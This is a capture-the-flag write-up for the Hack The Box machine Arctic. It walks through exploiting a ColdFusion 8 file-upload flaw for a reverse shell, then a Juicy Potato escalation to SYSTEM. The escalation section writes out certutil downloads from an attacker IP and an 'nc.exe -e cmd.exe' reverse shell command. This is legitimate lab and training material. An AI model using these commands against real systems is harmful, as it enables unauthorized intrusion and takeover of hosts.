# Arctic [HTB](https://app.hackthebox.com/machines/Arctic)
![arctic-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/arctic-01.png)


## recon 

Lets add an entry to `/etc/hosts` for this box: 

![hosts-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/hosts-02.png)


Now we can start enumerating with nmap:

`nmap -sC -sV -A -p- acrtic.htb -oN nmap.result`

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/nmap-res-03.png)

We have the following:

+ An RPC endpoint mapper on port 135, and another RPC related port on 49154.
+ A JRun HTTP server on port 8500.


Lets go check the site. 


### HTTP 8500


If we open our browser and navigate towards `http://arctic.htb:8500`:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/site-04.png)

We can see we have two folders. If go into the first folder, we can see an `adminstrator` folder:

![admin-folder-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/admin-folder-05.png)

Which leads to an admin portal:

![admin-portal-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/admin-portal-06.png)

We can see this tech is Adobe ColdFusion 8. 

ColdFusion Markup Language is an interpreted language utilizing a Java backend. It allows direct 
access to Java via its cfscript tags, while simultaneously offering a simple web wrapper. 
It is vulnerable to a variety of attacks, but mainly Local File Disclosure (LFD) and SQL injection. 

If we search ColdFusion 8 on google, we can quickly find a [public exploit](https://www.exploit-db.com/exploits/50057): 

![exploit-db-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/exploit-db-07.png)


Apperatnly there is an upload file feature on the application in:

`/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm`


The exploit generates a `java/jsp_shell_reverse_tcp` payload using `msfvenom`, and saves it to a file.
Then, it sends the file to the server in a specific form. Finally it navigates to the reverse shell's
location to execute it while setting up a listener. Lets try it out. 

After downloading it, make sure to update your lhost/rhost information in the exploit:

![edit-exploit-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/edit-exploit-08.png)

We should be good to go, lets execute with:

`python3 rce_exploit.py`

![execute-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/execute-09.png)


At the end you should get a shell:

![shell-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/shell-10.png)



## Privilege Escalation


Lets run `systeminfo` on our tagret:

![sysinfo-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/sysinfo-11.png)


We can see the target is a:

+ Windows 2008 R2 server standard.  
+ 6.1.7600 N/A Build 7600
+ X64 arhc 

After Following [sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html) checklist for a bit, i found nothing meaningful. 

I also tried running [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) but without success.

So i decided to look at our user's privileges with `whoami  /priv`:

![privs-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/privs-12.png)


Looks like we have `SeImpersonatePrivilege` enabled. We might be able to expoit this with a [potato attack](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/). 

+ Download the exploit from [here](https://github.com/ohpe/juicy-potato/releases).

+ Host the exploit to the target by starting a python server with:

`python3 -m http.server 80`

+ Transfer the exploit to the target with:

`certutil -urlcache -f http://10.10.14.20/JuicyPotato.exe potato.exe`

+ Tranfer a copy of `/usr/share/windows-resources/binaries/nc.exe` to the target as well. 

`certutil -urlcache -f http://10.10.14.20/nc.exe nc.exe`

+ Set up the local listener: 

`nc -lnvp 9009`

+ Execute `potato.exe -l 9009 -p C:\windows\system32\cmd.exe -a "/c c:\\Users\tolis\nc.exe -e cmd.
exe 10.10.14.20 9009" -t *`

+ Get system: 

![root-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arctic/img/root-13.png)
